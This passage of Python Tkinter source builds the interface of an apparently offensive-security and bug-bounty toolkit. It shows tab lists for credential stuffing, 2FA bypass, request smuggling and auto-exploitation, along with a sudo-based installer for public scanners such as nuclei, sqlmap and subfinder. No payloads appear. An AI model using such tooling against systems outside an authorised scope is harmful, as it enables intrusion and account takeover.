            ("☁️", "Cloud Sec",      "ADVANCED",    self._build_cloud_sec),
            ("🕸️", "API Tester",     "ADVANCED",    self._build_api_tester),
            ("💼", "BB Manager",     "ADVANCED",    self._build_bb_manager),
            ("🧬", "Biz Logic",      "ADVANCED",    self._build_biz_logic),
            # ── NEW POWER TOOLS ──────────────────────────────────
            ("📡", "OAST Server",    "POWER",       self._build_oast_tab),
            ("🔐", "JWT / OAuth",    "POWER",       self._build_jwt_oauth_tab),
            ("⚡", "Race Condition", "POWER",       self._build_race_tab),
            ("🕸️", "GraphQL Tester", "POWER",       self._build_graphql_tab),
            # ── v4 POWER TOOLS ───────────────────────────────────
            ("☁️", "SSRF Suite",     "POWER",       self._build_ssrf_tab),
            ("🔑", "2FA Bypass",     "POWER",       self._build_mfa_tab),
            ("🔀", "HTTP Smuggling", "POWER",       self._build_smuggling_tab),
            # ── v4 WEB SCANNERS ──────────────────────────────────
            ("🧬", "Prototype Poll", "POWER",       self._build_proto_tab),
            ("🌊", "Cache Poisoning","POWER",       self._build_cache_tab),
            ("🔓", "CORS Exploit",   "POWER",       self._build_cors_tab),
            ("↪️", "Open Redirect",  "POWER",       self._build_redirect_tab),
            ("💉", "NoSQL Inject",   "POWER",       self._build_nosql_tab),
            ("🔌", "WebSocket",      "POWER",       self._build_ws_tab),
            ("📄", "XXE Exploiter",  "POWER",       self._build_xxe_tab),
            ("🔗", "OAuth ATO",      "POWER",       self._build_oauth_ato_tab),
            # ── v4 INTEL TOOLS ────────────────────────────────────
            ("🪣", "S3 Bucket Hunt", "INTEL",       self._build_s3_tab),
            ("🏴", "Subdomain TKO",  "INTEL",       self._build_tko_tab),
            ("⛏️", "Param Mining",   "INTEL",       self._build_param_tab),
            ("🔑", "Cred Stuffing",  "INTEL",       self._build_cred_tab),
            ("🔐", "JWT Wordlist",   "INTEL",       self._build_jwt_wl_tab),
            # ── v4 ANALYSIS TOOLS ─────────────────────────────────
            ("🔭", "Shodan Exploit", "SCAN",        self._build_shodan_exploit_tab),
            ("🎯", "Mass Scanner",   "SCAN",        self._build_mass_scan_tab),
            ("📝", "Source SAST",    "SCAN",        self._build_sast_tab),
            ("🔗", "API Tester",     "SCAN",        self._build_api_swagger_tab),
            # ── v4 AI TOOLS ───────────────────────────────────────
            ("🤖", "AI Assistant",   "AI",          self._build_ai_assistant),
            ("🧠", "AI Auto-Exploit","AI",          self._build_ai_exploit_tab),
            ("📊", "Smart Reporter", "AI",          self._build_smart_reporter_tab),
            ("🔬", "Nuclei AI Gen",  "AI",          self._build_nuclei_ai_tab),
            ("⚙️", "Settings",       "SYSTEM",      self._build_settings),
        ]

        # Category colors
        CAT_COLORS = {
            "MAIN":     ACCENT,
            "RECON":    CYAN,
            "SCAN":     YELLOW,
            "EXPLOIT":  RED,
            "RESULTS":  GREEN,
            "INTEL":    PURPLE,
            "AUTO":     ORANGE,
            "ADVANCED": FG2,
            "POWER":    "#ff6b6b",
            "AI":       PINK,
            "SYSTEM":   FG3,
        }

        # Pre-built frame cache (lazy loading)
        self._tab_frames      = {}
        self._tab_builders    = {i: builder for i, (_, _, _, builder) in enumerate(TABS)}
        self._current_tab_idx = 0
        self._current_frame   = None
        self._sidebar_btns    = []

        # ── Build sidebar buttons ─────────────────────────────────
        last_cat = None
        for i, (icon, name, cat, _) in enumerate(TABS):
            cat_clr = CAT_COLORS.get(cat, FG3)

            # Category header
            if cat != last_cat:
                if last_cat is not None:
                    tk.Frame(sb_inner, bg=BORDER, height=1).pack(fill='x', padx=12, pady=(4,2))
                cat_lbl = tk.Label(sb_inner,
                                   text=f"  ▸  {cat}",
                                   bg=BG6, fg=cat_clr,
                                   font=(_MONO_FACE, 7, 'bold'), anchor='w')
                cat_lbl.pack(fill='x', padx=4, pady=(8,2))
                last_cat = cat

            # Tab button — with left indicator bar
            btn_frame = tk.Frame(sb_inner, bg=BG6, cursor='hand2')
            btn_frame.pack(fill='x', padx=4, pady=1)

            indicator = tk.Frame(btn_frame, bg=BG6, width=3)
            indicator.pack(side='left', fill='y')

            icon_lbl = tk.Label(btn_frame, text=icon, bg=BG6, fg=cat_clr,
                                font=(_MONO_FACE, 11), width=2)
            icon_lbl.pack(side='left', padx=(6, 4))

            name_lbl = tk.Label(btn_frame, text=name, bg=BG6, fg=FG2,
                                 font=(_MONO_FACE, 9), anchor='w')
            name_lbl.pack(side='left', fill='x', expand=True, pady=7)

            self._sidebar_btns.append((btn_frame, icon_lbl, name_lbl, cat_clr, indicator))

            def _enter(e, bf=btn_frame, il=icon_lbl, nl=name_lbl, clr=cat_clr, ind=indicator):
                if bf.cget('bg') != BG5:
                    bf.config(bg=BG4); il.config(bg=BG4); nl.config(bg=BG4, fg=FG)
                    ind.config(bg=BG4)
            def _leave(e, bf=btn_frame, il=icon_lbl, nl=name_lbl, idx=i, ind=indicator):
                if idx != self._current_tab_idx:
                    bf.config(bg=BG6); il.config(bg=BG6); nl.config(bg=BG6, fg=FG2)
                    ind.config(bg=BG6)

            for w in (btn_frame, icon_lbl, name_lbl, indicator):
                w.bind('<Button-1>', lambda e, idx=i: self._switch_tab(idx))
                w.bind('<Enter>', _enter)
                w.bind('<Leave>', _leave)

        # ── Sidebar search filter ─────────────────────────────────
        def _filter_sidebar(*_):
            q = self._sb_search_var.get().lower().strip()
            for i2, (bf, il, nl, clr, ind) in enumerate(self._sidebar_btns):
                tab_name = TABS[i2][1].lower()
                tab_cat  = TABS[i2][2].lower()
                if not q or q in tab_name or q in tab_cat:
                    bf.pack(fill='x', padx=4, pady=1)
                else:
                    bf.pack_forget()
        self._sb_search_var.trace_add('write', _filter_sidebar)

        # ── Content switcher — defined BEFORE any reference to it ──
        def _switch_to(idx: int):
            old = self._current_tab_idx
            if 0 <= old < len(self._sidebar_btns):
                bf_old, il_old, nl_old, clr_old, ind_old = self._sidebar_btns[old]
                bf_old.config(bg=BG6, highlightbackground=BG6); il_old.config(bg=BG6)
                nl_old.config(bg=BG6, fg=FG2)
                ind_old.config(bg=BG6)

            if self._current_frame:
                self._current_frame.pack_forget()

            if idx not in self._tab_frames:
                f2 = tk.Frame(content_area, bg=BG)
                f2.pack(fill='both', expand=True)
                try:
                    self._tab_builders[idx](f2)
                    # Re-apply treeview colors after each new tab loads (Linux fix)
                    self.root.after(50, self._force_treeview_colors)
                except Exception as ex:
                    import traceback
                    tk.Label(f2,
                             text=f"⚠ Error loading tab:\n\n{ex}\n\n{traceback.format_exc()[:600]}",
                             bg=BG, fg=RED, font=MONO_S, justify='left',
                             wraplength=800).pack(padx=20, pady=20, anchor='w')
                self._tab_frames[idx] = f2
            else:
                self._tab_frames[idx].pack(fill='both', expand=True)

            if 0 <= idx < len(self._sidebar_btns):
                bf_new, il_new, nl_new, clr_new, ind_new = self._sidebar_btns[idx]
                bf_new.config(bg=BG5)
                il_new.config(bg=BG5, fg=clr_new)
                nl_new.config(bg=BG5, fg=clr_new)
                ind_new.config(bg=clr_new)
                try:
                    sb_canvas.update_idletasks()
                    y_pos = bf_new.winfo_y()
                    total = sb_inner.winfo_height()
                    if total > 0:
                        sb_canvas.yview_moveto(max(0, (y_pos - 100) / total))
                except Exception:
                    pass

            self._current_frame   = self._tab_frames[idx]
            self._current_tab_idx = idx

            if TABS[idx][1] == "Findings" and self._findings_tree:
                try: self._refresh_findings()
                except Exception: pass

        # Store as instance method so all code can call it
        self._switch_tab = _switch_to
        self._tabs_list  = TABS

        # FakeNB now works because _switch_to is defined
        self.nb.select = lambda idx: _switch_to(idx)

        # Load Dashboard
        _switch_to(0)

    def _on_tab_changed(self, event=None):
        """Handled by sidebar switcher now."""
        pass

    # ── Core helpers ──────────────────────────────────────────────
    def run_with_audit(self, terminal, cmd, label=''):
        """Run command and automatically log to audit log with current user."""
        username = self.user.get('username', 'unknown')
        terminal.run_command(cmd, label=label, user=username)

    def _goto_tab(self, name: str):
        """Switch to sidebar tab by name."""
        for i, (_, n, _, _) in enumerate(self._tabs_list):
            if n == name:
                self._switch_tab(i)
                return

    def _goto_settings(self):
        """Shortcut to open Settings tab."""
        self._goto_tab("Settings")

    def _proj_out(self, filename: str, target: str = "") -> str:
        """Return path logs/<project>/<filename>, creating dir. Falls back to target name."""
        proj = self.project.get() or (target.replace('https://','').replace('http://','').split('/')[0] if target else "default")
        proj_dir = LOGS_DIR / proj
        proj_dir.mkdir(parents=True, exist_ok=True)
        return str(proj_dir / filename)

    def set_status(self, msg, color=None):
        self._status_var.set(f"  ●  {msg}")
        self._status_lbl.config(fg=color or FG2)

    def _proj_names(self):
        return [p["name"] for p in load_projects()]

    def _on_project_change(self):
        proj = self.project.get()
        self.passive_target.set(proj)
        self.active_target.set(proj)
        self.vuln_target.set(f"https://{proj}")
        self.url_target.set(proj)
        self.set_status(f"Project: {proj}", CYAN)
        self._refresh_findings()
        self._refresh_results()

    def _new_project(self):
        name = simpledialog.askstring("New Project","Target domain/name:", parent=self.root)
        if not name: return
        desc = simpledialog.askstring("Description","Short description (optional):", parent=self.root) or ""
        save_project({"name":name,"description":desc,"target":name})
        names = self._proj_names()
        self.proj_combo['values'] = names
        self.project.set(name)
        self._on_project_change()
        self.set_status(f"Project '{name}' created", GREEN)

    def _get_target(self, var):
        t = var.get().strip() or self.project.get()
        if not t:
            messagebox.showwarning("No Target","Set a target or select a project.", parent=self.root)
        return t

    def _show_text(self, title, content):
        win = tk.Toplevel(self.root); win.title(title)
        win.configure(bg=BG); win.geometry("800x620")
        tk.Frame(win, bg=ACCENT, height=2).pack(fill='x')
        hf = mk_frame(win, bg=BG2); hf.pack(fill='x')
        tk.Label(hf, text=title, bg=BG2, fg=ACCENT, font=MONO_B).pack(side='left', padx=14, pady=8)
        txt = mk_stext(win, h=30, bg=BG3, fg=FG); txt.pack(fill='both', expand=True, padx=12, pady=(0,8))
        txt.insert('end', content)
        bf = mk_frame(win, bg=BG); bf.pack(fill='x', padx=12, pady=6)
        def copy():
            self.root.clipboard_clear(); self.root.clipboard_append(content)
            self.set_status("Copied to clipboard!", GREEN)
        mk_btn(bf, "📋 Copy All", copy, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save", lambda: self._save_text(content), FG2, small=True).pack(side='left', padx=4)

    def _save_text(self, content):
        path = filedialog.asksaveasfilename(defaultextension='.txt', filetypes=[("Text","*.txt")])
        if path:
            with open(path,'w') as f: f.write(content)
            self.set_status(f"Saved: {path}", GREEN)

    def _show_search(self):
        win = tk.Toplevel(self.root); win.title("🔍 Global Search")
        win.configure(bg=BG); win.geometry("780x520")
        tk.Frame(win, bg=ACCENT, height=2).pack(fill='x')
        pad = mk_frame(win, bg=BG); pad.pack(fill='both', expand=True, padx=16, pady=12)
        tk.Label(pad, text="SEARCH ACROSS ALL FINDINGS", bg=BG, fg=ACCENT, font=MONO_B).pack(anchor='w', pady=(0,8))
        sv = tk.StringVar()
        se = mk_entry(pad, var=sv, w=60); se.pack(fill='x', ipady=5, pady=(0,10)); se.focus()
        cols = ('ID','Project','Title','Severity','Type','Status')
        tree = mk_tree(pad, columns=cols, show='headings', height=16)
        for c in cols:
            w = {'ID':65,'Project':110,'Title':280,'Severity':80,'Type':120,'Status':70}
            tree.heading(c, text=c); tree.column(c, width=w.get(c,100))
        vsb = ttk.Scrollbar(pad, orient='vertical', command=tree.yview)
        tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG); tf.pack(fill='both', expand=True)
        tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        for sev in ('CRITICAL','HIGH','MEDIUM','LOW','INFO'):
            tree.tag_configure(sev, foreground=SEV_COLOR(sev), background=SEV_BG(sev))
        count_lbl = tk.Label(pad, text="", bg=BG, fg=FG3, font=MONO_S)
        count_lbl.pack(anchor='w', pady=(4,0))
        def do_search(*_):
            q = sv.get().lower().strip()
            tree.delete(*tree.get_children())
            matches = 0
            for f in load_findings():
                haystack = json.dumps(f).lower()
                if not q or q in haystack:
                    sev = f.get('severity','INFO').upper()
                    tree.insert('','end', values=(f.get('id',''), f.get('project',''),
                                f.get('title',''), sev, f.get('type',''), f.get('status','Open')),
                                tags=(sev,))
                    matches += 1
            count_lbl.config(text=f"{matches} result(s)")
        sv.trace_add('write', do_search); do_search()

    def _toggle_theme(self):
        new = 'light' if _theme == 'dark' else 'dark'
        apply_theme(new)
        messagebox.showinfo("Theme", f"Theme set to {new.upper()}.\nRestart app to fully apply.", parent=self.root)

    # ═════════════════════════════════════════════════════════════
    #  TOOL INSTALLER (Feature 1)
    # ═════════════════════════════════════════════════════════════
    def _show_tool_installer(self):
        win = tk.Toplevel(self.root); win.title("🛠 Tool Installer")
        win.configure(bg=BG); win.geometry("900x700")
        tk.Frame(win, bg=YELLOW, height=3).pack(fill='x')
        hf = mk_frame(win, bg=BG2); hf.pack(fill='x')
        tk.Label(hf, text="🛠  TOOL INSTALLER & STATUS", bg=BG2, fg=YELLOW, font=MONO_H).pack(side='left', padx=14, pady=10)
        pad = mk_frame(win, bg=BG); pad.pack(fill='both', expand=True, padx=16, pady=12)

        TOOLS_CATALOG = [
            # (name, install_type, description, category)
            ("subfinder",    "go",     "Passive subdomain enum",        "Recon"),
            ("amass",        "go",     "DNS intelligence & enum",       "Recon"),
            ("assetfinder",  "go",     "Fast subdomain discovery",      "Recon"),
            ("dnsx",         "go",     "DNS resolution & bruteforce",   "Recon"),
            ("httpx",        "go",     "HTTP probe & tech detect",      "Recon"),
            ("katana",       "go",     "Web crawler (JS-aware)",        "URL Discovery"),
            ("gau",          "go",     "Get all URLs (Wayback/OTX)",    "URL Discovery"),
            ("waybackurls",  "go",     "Wayback Machine URL fetch",     "URL Discovery"),
            ("hakrawler",    "go",     "Simple web crawler",            "URL Discovery"),
            ("gospider",     "go",     "Fast web spider",               "URL Discovery"),
            ("subzy",        "go",     "Subdomain takeover checker",    "Takeover"),
            ("subjack",      "go",     "Subdomain takeover checker",    "Takeover"),
            ("arjun",        "go",     "HTTP param discovery",          "Params"),
            ("gf",           "go",     "Grep patterns on URLs",         "Params"),
            ("kxss",         "go",     "Reflected param finder",        "XSS"),
            ("qsreplace",    "go",     "URL param replacement",         "Utils"),
            ("anew",         "go",     "Append new lines to file",      "Utils"),
            ("naabu",        "go",     "Fast port scanner",             "Ports"),
            ("nuclei",       "go",     "Template-based vuln scanner",   "Vuln"),
            ("dalfox",       "go",     "XSS scanner & exploiter",       "Vuln"),
            ("interactsh-client","go", "OOB interaction server",        "Vuln"),
            ("tlsx",         "go",     "TLS info & cert enum",          "Recon"),
            ("nmap",         "apt",    "Port scanner & NSE scripts",    "Ports"),
            ("masscan",      "apt",    "Ultra-fast port scanner",       "Ports"),
            ("sqlmap",       "apt",    "SQL injection automation",      "Vuln"),
            ("gobuster",     "apt",    "Directory/DNS/vhost brute",     "Fuzzing"),
            ("ffuf",         "go",     "Fast web fuzzer",               "Fuzzing"),
            ("dirsearch",    "apt",    "Web path discovery",            "Fuzzing"),
            ("nikto",        "apt",    "Web server scanner",            "Vuln"),
            ("wafw00f",      "apt",    "WAF detection",                 "Recon"),
            ("gowitness",    "go",     "Web screenshot tool",           "Utils"),
            ("theHarvester", "pip",    "OSINT email/IP/domain harvest", "OSINT"),
            ("spyhunt",      "pip",    "Multi-source OSINT recon",      "OSINT"),
        ]

        # Category filter
        cf = mk_frame(pad, bg=BG); cf.pack(fill='x', pady=(0,10))
        tk.Label(cf, text="Category:", bg=BG, fg=FG3, font=MONO_S).pack(side='left')
        cat_var = tk.StringVar(value="All")
        cats = ["All"] + sorted(set(t[3] for t in TOOLS_CATALOG))
        cat_cb = ttk.Combobox(cf, textvariable=cat_var, values=cats, width=16, font=MONO_S)
        cat_cb.pack(side='left', padx=8)

        # Treeview
        cols2 = ('Tool','Type','Category','Status','Description')
        tt = mk_tree(pad, columns=cols2, show='headings', height=18)
        wsz2 = {'Tool':130,'Type':60,'Category':110,'Status':90,'Description':320}
        for c in cols2: tt.heading(c, text=c); tt.column(c, width=wsz2.get(c,100))
        tt.tag_configure('installed',    foreground=GREEN, background=BG3)
        tt.tag_configure('not_installed',foreground=RED, background=BG3)
        vsb2 = ttk.Scrollbar(pad, orient='vertical', command=tt.yview)
        tt.configure(yscrollcommand=vsb2.set)
        tf2 = mk_frame(pad, bg=BG); tf2.pack(fill='both', expand=True)
        tt.pack(side='left', fill='both', expand=True, in_=tf2)
        vsb2.pack(side='right', fill='y', in_=tf2)

        def refresh_tool_list(*_):
            tt.delete(*tt.get_children())
            filt = cat_var.get()
            for name, typ, desc, cat in TOOLS_CATALOG:
                if filt != "All" and cat != filt: continue
                ok = shutil.which(name) is not None
                status = "✓ Installed" if ok else "✗ Not found"
                tag = 'installed' if ok else 'not_installed'
                tt.insert('','end', values=(name, typ.upper(), cat, status, desc), tags=(tag,))

        cat_cb.bind("<<ComboboxSelected>>", refresh_tool_list)
        refresh_tool_list()

        # Terminal for install output
        term = Terminal(pad, height=7, title="INSTALLER OUTPUT")
        term.pack(fill='x', pady=(10,0))

        bf = mk_frame(pad, bg=BG); bf.pack(fill='x', pady=(8,0))
        install_script = str(BASE_DIR / "tools" / "install_tools.sh")

        GO_INSTALL_PATHS = {
            "subfinder":         "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
            "amass":             "github.com/owasp-amass/amass/v4/...@master",
            "assetfinder":       "github.com/tomnomnom/assetfinder@latest",
            "dnsx":              "github.com/projectdiscovery/dnsx/cmd/dnsx@latest",
            "httpx":             "github.com/projectdiscovery/httpx/cmd/httpx@latest",
            "katana":            "github.com/projectdiscovery/katana/cmd/katana@latest",
            "gau":               "github.com/lc/gau/v2/cmd/gau@latest",
            "waybackurls":       "github.com/tomnomnom/waybackurls@latest",
            "hakrawler":         "github.com/hakluke/hakrawler@latest",
            "gospider":          "github.com/jaeles-project/gospider@latest",
            "subzy":             "github.com/LukaSikic/subzy@latest",
            "subjack":           "github.com/haccer/subjack@latest",
            "arjun":             "github.com/s0md3v/arjun@latest",
            "gf":                "github.com/tomnomnom/gf@latest",
            "kxss":              "github.com/Emoe/kxss@latest",
            "qsreplace":         "github.com/tomnomnom/qsreplace@latest",
            "anew":              "github.com/tomnomnom/anew@latest",
            "naabu":             "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
            "nuclei":            "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
            "dalfox":            "github.com/hahwul/dalfox/v2@latest",
            "interactsh-client": "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
            "tlsx":              "github.com/projectdiscovery/tlsx/cmd/tlsx@latest",
            "ffuf":              "github.com/ffuf/ffuf/v2@latest",
            "gowitness":         "github.com/sensepost/gowitness@latest",
        }

        def install_selected():
            sel = tt.selection()
            if not sel:
                messagebox.showwarning("None Selected","Select tools to install.", parent=win); return
            for iid in sel:
                vals = tt.item(iid)['values']
                tool_name = vals[0]; tool_type = vals[1].lower()
                if tool_type == "go":
                    if not shutil.which("go"):
                        term.log("[!] Go not found. Install it first:", 'error')
                        term.log("    sudo apt-get install -y golang-go", 'warn')
                        term.log("    or visit: https://go.dev/dl/", 'warn')
                        continue
                    go_path = GO_INSTALL_PATHS.get(
                        tool_name,
                        f"github.com/projectdiscovery/{tool_name}/cmd/{tool_name}@latest"
                    )
                    term.log(f"[*] go install {go_path}", 'info')
                    term.run_command(
                        ["bash", "-c",
                         f"go install {go_path} 2>&1 && echo '[+] {tool_name} installed OK'"
                         f" || echo '[-] {tool_name} install failed'"],
                        label=f"Install {tool_name}"
                    )
                elif tool_type == "apt":
                    term.run_command(["sudo","apt-get","install","-y",tool_name], label=f"apt install {tool_name}")
                elif tool_type == "pip":
                    term.run_command(["pip3","install",tool_name,"--break-system-packages"], label=f"pip install {tool_name}")
        def install_all():
            term.log("[*] Running full installer script...", 'warn')
            term.run_command(["sudo","bash", install_script], label="Full Auto-Install")

        def refresh_status():
            refresh_tool_list()
            self.set_status("Tool status refreshed", GREEN)

        mk_btn(bf, "▶ Install Selected", install_selected, GREEN).pack(side='left', padx=4)
        mk_btn(bf, "⚡ Install ALL",      install_all,      YELLOW).pack(side='left', padx=4)
        mk_btn(bf, "🔄 Refresh Status",  refresh_status,   CYAN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "📂 Open /tools/",
               lambda: open_folder(str(BASE_DIR/'tools')),
               FG2, small=True).pack(side='left', padx=4)

    # ═════════════════════════════════════════════════════════════
    #  DASHBOARD
    # ═════════════════════════════════════════════════════════════
    def _build_dashboard(self, frame):
        frame.configure(bg=BG2)
        cv = tk.Canvas(frame, bg=BG2, highlightthickness=0)
        vsb = ttk.Scrollbar(frame, orient='vertical', command=cv.yview)
        cv.configure(yscrollcommand=vsb.set)
        vsb.pack(side='right', fill='y'); cv.pack(side='left', fill='both', expand=True)
        inner = mk_frame(cv, bg=BG2)
        cw = cv.create_window((0,0), window=inner, anchor='nw')
        inner.bind("<Configure>", lambda e: cv.configure(scrollregion=cv.bbox('all')))
        cv.bind("<Configure>", lambda e: cv.itemconfig(cw, width=e.width))
        pad = mk_frame(inner, bg=BG2); pad.pack(fill='both', expand=True, padx=24, pady=20)

        # Greeting
        now = datetime.now()
        greet = "Good morning" if now.hour < 12 else "Good afternoon" if now.hour < 18 else "Good evening"
        top_f = mk_frame(pad, bg=BG2); top_f.pack(fill='x', pady=(0,20))
        tk.Label(top_f, text=f"{greet}, {self.user['username']}",
                 bg=BG2, fg=FG, font=('Consolas',17,'bold')).pack(side='left')
        tk.Label(top_f, text=f"  {now.strftime('%A, %d %B %Y  |  %H:%M')}",
                 bg=BG2, fg=FG3, font=MONO_S).pack(side='left')

        # Stat cards
        findings = load_findings(); projects = load_projects()
        sg = mk_frame(pad, bg=BG2); sg.pack(fill='x', pady=(0,20))
        crit_count = sum(1 for f in findings if f.get('severity','').upper()=='CRITICAL')
        high_count  = sum(1 for f in findings if f.get('severity','').upper()=='HIGH')
        open_count  = sum(1 for f in findings if f.get('status','Open')=='Open')
        res_count   = sum(1 for f in findings if f.get('status','')=='Fixed')
        stats = [
            ("PROJECTS",  str(len(projects)), CYAN,   "targets scoped"),
            ("FINDINGS",  str(len(findings)), FG,     "total vulnerabilities"),
            ("CRITICAL",  str(crit_count),    RED,    "immediate action"),
            ("HIGH",      str(high_count),    YELLOW, "high priority"),
            ("OPEN",      str(open_count),    GREEN,  "pending fixes"),
            ("RESOLVED",  str(res_count),     FG3,    "fixed"),
        ]
        for i,(label,val,color,sub) in enumerate(stats):
            c = mk_stat(sg, label, val, color, sub)
            c.grid(row=0, column=i, padx=4, sticky='nsew')
            sg.columnconfigure(i, weight=1)

        # Scope Manager (Feature 2)
        mk_section(pad, "SCOPE MANAGER", "🎯").pack(fill='x', pady=(0,8))
        sc = mk_card(pad); sc.pack(fill='x', pady=(0,16))
        sf = mk_frame(sc, bg=BG3); sf.pack(fill='x', padx=14, pady=10)
        tk.Label(sf, text="In-Scope:", bg=BG3, fg=FG2, font=MONO_S).pack(side='left')
        mk_entry(sf, var=self.scope_include, w=32).pack(side='left', padx=8, ipady=3)
        tk.Label(sf, text="Exclude:", bg=BG3, fg=FG2, font=MONO_S).pack(side='left', padx=(12,4))
        mk_entry(sf, var=self.scope_exclude, w=24).pack(side='left', ipady=3)
        def add_scope():
            inc = self.scope_include.get().strip()
            if inc and inc not in self._scope_list:
                self._scope_list.append(inc)
                self._refresh_scope_display(scope_lbl)
                self.set_status(f"Added to scope: {inc}", GREEN)
        def clear_scope():
            self._scope_list.clear()
            self._refresh_scope_display(scope_lbl)
        mk_btn(sf, "+ Add", add_scope, GREEN, small=True).pack(side='left', padx=8)
        mk_btn(sf, "Clear", clear_scope, RED, small=True).pack(side='left', padx=2)
        scope_lbl = tk.Label(sc, text="No scope defined", bg=BG3, fg=FG3, font=MONO_S, wraplength=800)
        scope_lbl.pack(padx=14, pady=(0,10), anchor='w')

        # Quick Actions
        mk_section(pad, "QUICK ACTIONS", "⚡").pack(fill='x', pady=(0,8))
        qa = mk_frame(pad, bg=BG2); qa.pack(fill='x', pady=(0,16))
        def _goto(name):
            if hasattr(self, '_tabs_list'):
                for i2, (_, n, _, _) in enumerate(self._tabs_list):
                    if n == name:
                        self._switch_tab(i2); return
        for txt, name, clr in [
            ("▶ Recon", "Recon", CYAN), ("▶ URL Discovery", "URL Discovery", GREEN),
            ("▶ Vuln Scan", "Vuln Scanner", YELLOW), ("▶ Findings", "Findings", RED),
            ("▶ Results", "Results", PURPLE), ("▶ Report", "Reports", ACCENT)
        ]:
            mk_btn(qa, txt, lambda n=name: _goto(n), clr, small=True).pack(side='left', padx=4, pady=2)

        # Tool status strip
        mk_section(pad, "TOOL STATUS", "🔧").pack(fill='x', pady=(0,8))
        tc = mk_card(pad); tc.pack(fill='x', pady=(0,16))
        tf3 = mk_frame(tc, bg=BG3); tf3.pack(fill='x', padx=14, pady=10)
        tools_to_check = ["subfinder","amass","katana","gau","waybackurls","subzy",
                          "httpx","nmap","nuclei","dalfox","sqlmap","ffuf",
                          "gobuster","hakrawler","gospider","arjun","gowitness","wafw00f"]
        for i, t in enumerate(tools_to_check):
            ok = shutil.which(t) is not None
            tk.Label(tf3, text=f"{'●' if ok else '○'} {t}",
                     bg=BG3, fg=GREEN if ok else RED, font=(_MONO_FACE,8)).grid(
                row=i//6, column=i%6, sticky='w', padx=8, pady=3)

        # Recent findings - full detail
        mk_section(pad, "RECENT FINDINGS", "🚩").pack(fill='x', pady=(0,8))
        all_findings = load_findings()
        if all_findings:
            cols_rf = ('Severity','Title','Type','URL','Status','Date')
            rtree = mk_tree(pad, columns=cols_rf, show='headings', height=12)
            wsz_rf = {'Severity':80,'Title':280,'Type':100,'URL':220,'Status':75,'Date':95}
            for c in cols_rf:
                rtree.heading(c, text=c, anchor='w')
                rtree.column(c, width=wsz_rf.get(c,100), anchor='w')
            vsb2 = ttk.Scrollbar(pad, orient='vertical', command=rtree.yview)
            rtree.configure(yscrollcommand=vsb2.set)
            tf2 = mk_frame(pad, bg=BG2); tf2.pack(fill='both', expand=True, pady=(0,4))
            rtree.pack(side='left', fill='both', expand=True, in_=tf2)
            vsb2.pack(side='right', fill='y', in_=tf2)
            for sev in ('CRITICAL','HIGH','MEDIUM','LOW','INFO'):
                rtree.tag_configure(sev, foreground=SEV_COLOR(sev), background=SEV_BG(sev))
            for f2 in reversed(all_findings):
                sev = f2.get('severity','INFO').upper()
                rtree.insert('', 0, values=(
                    sev,
                    f2.get('title','')[:50],
                    f2.get('type',''),
                    f2.get('url','')[:50],
                    f2.get('status','Open'),
                    str(f2.get('timestamp',''))[:10]), tags=(sev,))
            def go_findings(e): self._goto_tab("Findings")
            rtree.bind('<Double-1>', go_findings)
        else:
            tk.Label(pad, text="No findings yet. Add findings in the Findings tab.",
                     bg=BG2, fg=FG3, font=MONO_S).pack(pady=20)

        # Project Notes (Feature 3)
        mk_section(pad, "PROJECT NOTES", "📝").pack(fill='x', pady=(0,8))
        notes_card = mk_card(pad); notes_card.pack(fill='x', pady=(0,8))
        notes_inner = mk_frame(notes_card, bg=BG3); notes_inner.pack(fill='x', padx=14, pady=10)
        notes_txt = mk_stext(notes_inner, h=5, bg=BG4, fg=FG)
        notes_txt.pack(fill='x', pady=(0,8))
        def save_notes():
            proj = self.project.get() or "global"
            self._project_notes[proj] = notes_txt.get('1.0','end').strip()
            self.set_status("Notes saved!", GREEN)
        def load_notes():
            proj = self.project.get() or "global"
            notes_txt.config(state='normal'); notes_txt.delete('1.0','end')
            notes_txt.insert('end', self._project_notes.get(proj,''))
        nf = mk_frame(notes_inner, bg=BG3); nf.pack(fill='x')
        mk_btn(nf, "💾 Save Notes", save_notes, GREEN, small=True).pack(side='left', padx=4)
        mk_btn(nf, "🔄 Load", load_notes, FG2, small=True).pack(side='left', padx=4)

    def _refresh_scope_display(self, lbl):
        if self._scope_list:
            lbl.config(text="  •  ".join(self._scope_list), fg=GREEN)
        else:
            lbl.config(text="No scope defined", fg=FG3)

    # ═════════════════════════════════════════════════════════════
    #  RECON
    # ═════════════════════════════════════════════════════════════
    def _build_recon(self, frame):
        frame.configure(bg=BG2)
        paned = tk.PanedWindow(frame, orient='vertical', bg=BG, sashwidth=5, sashrelief='flat')
        paned.pack(fill='both', expand=True)
        top = mk_frame(paned, bg=BG2); paned.add(top, stretch='always')
        nb2 = ttk.Notebook(top); nb2.pack(fill='both', expand=True)

        # Category tabs
        pf  = tk.Frame(nb2, bg=BG2); nb2.add(pf,  text="  🕵 Passive Recon  ")
        af  = tk.Frame(nb2, bg=BG2); nb2.add(af,  text="  🗺 Active Recon  ")
        ohf = tk.Frame(nb2, bg=BG2); nb2.add(ohf, text="  🎯 Origin Hunter  ")

        # Info bar
        info_bar = mk_frame(top, bg=BG6)
        info_bar.pack(fill='x', before=nb2)
        info_items = [
            ("🕵 Passive", "No target touch — safe", FG3),
            ("🗺 Active",  "Touches target — use carefully", YELLOW),
            ("🎯 Origin",  "Find real IP behind CDN", CYAN),
            ("🧅 Tor",     "Anonymous — use Tor Recon tab", ACCENT),
            ("📡 Deep",    "Full intel — use Deep Intel tab", GREEN),
        ]
        for label, tip, clr in info_items:
            f2 = mk_frame(info_bar, bg=BG6); f2.pack(side='left', padx=8, pady=4)
            tk.Label(f2, text=label, bg=BG6, fg=clr, font=(_MONO_FACE,8,'bold')).pack(side='left')
            tk.Label(f2, text=f" — {tip}", bg=BG6, fg=FG3, font=(_MONO_FACE,8)).pack(side='left')
            tk.Frame(info_bar, bg=BORDER2, width=1).pack(side='left', fill='y', pady=6)

        self._build_passive(pf)
        self._build_active(af)
        self._build_origin_hunter(ohf)
        self.recon_term = Terminal(paned, height=13, title="RECON TERMINAL")
        paned.add(self.recon_term)
